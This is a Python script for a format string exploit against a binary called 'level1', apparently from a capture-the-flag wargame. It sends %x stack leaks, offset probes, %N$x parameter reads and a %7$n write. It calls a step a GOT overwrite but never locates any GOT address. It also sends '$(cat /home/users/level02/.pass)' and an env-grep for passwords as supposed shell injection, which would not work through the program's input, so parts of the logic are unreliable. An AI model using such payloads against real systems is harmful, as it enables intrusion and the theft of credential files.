#!/usr/bin/env python3
"""
Final Level1 Format String Exploit
"""

import struct
import subprocess
import sys

def send_input(program, username, password):
    """Send input to the program and capture output"""
    try:
        process = subprocess.Popen(
            [program],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        output, error = process.communicate(input=f"{username}\n{password}\n")
        return output, error, process.returncode
    except Exception as e:
        print(f"Error: {e}")
        return None, None, -1

def exploit():
    """Main exploit function"""
    print("Level1 Format String Exploit")
    print("=" * 40)
    
    # Step 1: Find the correct username and test format string
    username = "dat_wil"
    
    print("Step 1: Testing format string vulnerability...")
    test_payload = "%x%x%x%x%x%x%x%x"
    output, error, retcode = send_input("./level1", username, test_payload)
    
    if output:
        print(f"Format string test output: {output}")
    
    # Step 2: Find stack offset
    print("\nStep 2: Finding stack offset...")
    pattern = "AAAA"
    offset_payload = f"{pattern}.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x"
    output, error, retcode = send_input("./level1", username, offset_payload)
    
    if output:
        print(f"Offset test output: {output}")
        if "41414141" in output:
            print("✓ Found our pattern in output!")
        else:
            print("✗ Pattern not found, trying different offsets...")
    
    # Step 3: Test direct parameter access
    print("\nStep 3: Testing direct parameter access...")
    for i in range(1, 15):
        payload = f"%{i}$x"
        output, error, retcode = send_input("./level1", username, payload)
        if output:
            print(f"Parameter {i}: {output.strip()}")
    
    # Step 4: GOT overwrite attempt
    print("\nStep 4: Attempting GOT overwrite...")
    
    # Common GOT addresses (these need to be found dynamically)
    # puts@GOT: usually around 0x80497xx
    # printf@GOT: usually around 0x80497xx
    
    # Test with a safe write first
    safe_payload = "%7$n"  # Write to 7th parameter
    output, error, retcode = send_input("./level1", username, safe_payload)
    if output:
        print(f"Safe write test: {output}")
    
    # Step 5: Shell command injection
    print("\nStep 5: Attempting shell command injection...")
    
    # Try to inject shell commands through format string
    shell_payload = "$(cat /home/users/level02/.pass)"
    output, error, retcode = send_input("./level1", username, shell_payload)
    if output:
        print(f"Shell injection test: {output}")
    
    # Step 6: Environment variable injection
    print("\nStep 6: Testing environment variable injection...")
    env_payload = "$(env | grep -i pass)"
    output, error, retcode = send_input("./level1", username, env_payload)
    if output:
        print(f"Environment test: {output}")

def manual_exploit():
    """Manual exploit steps for user to follow"""
    print("\n" + "="*50)
    print("MANUAL EXPLOIT STEPS")
    print("="*50)
    
    print("1. Run the program:")
    print("   ./level1")
    
    print("\n2. Enter username: dat_wil")
    
    print("\n3. Test format string vulnerability:")
    print("   Enter password: %x%x%x%x%x%x")
    
    print("\n4. Find stack offset:")
    print("   Enter password: AAAA.%08x.%08x.%08x.%08x.%08x.%08x")
    print("   Look for 0x41414141 in output")
    
    print("\n5. Test direct parameter access:")
    print("   Enter password: %7$x")
    print("   Try different numbers (1-20)")
    
    print("\n6. Attempt GOT overwrite:")
    print("   Enter password: <address>%7$n")
    print("   Replace <address> with GOT address")
    
    print("\n7. If successful, you should get a shell")
    print("   Then run: cat /home/users/level02/.pass")

if __name__ == "__main__":
    print("Choose an option:")
    print("1. Run automated exploit development")
    print("2. Show manual exploit steps")
    
    choice = input("Enter choice (1 or 2): ").strip()
    
    if choice == "1":
        exploit()
    elif choice == "2":
        manual_exploit()
    else:
        print("Invalid choice. Running automated exploit...")
        exploit() 